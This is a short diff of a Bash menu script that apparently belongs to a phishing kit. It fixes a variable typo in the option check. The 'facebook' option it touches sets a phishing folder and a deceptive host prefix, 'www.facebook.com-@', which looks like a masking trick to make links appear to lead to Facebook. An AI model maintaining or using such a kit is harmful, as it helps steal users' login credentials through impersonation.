@@ -63,7 +63,7 @@ while true; do
 printf "\033[1;44mselect an option==> \033[0m"
 #................programe...............
 read phis
-if [[ $opt == '1' || $phis == '01' ]]; then
+if [[ $phis == '1' || $phis == '01' ]]; then
 printf "\033[1;34myou selected facebook \033[0m"
 pfolder=facebook
 hoster='www.facebook.com-@'
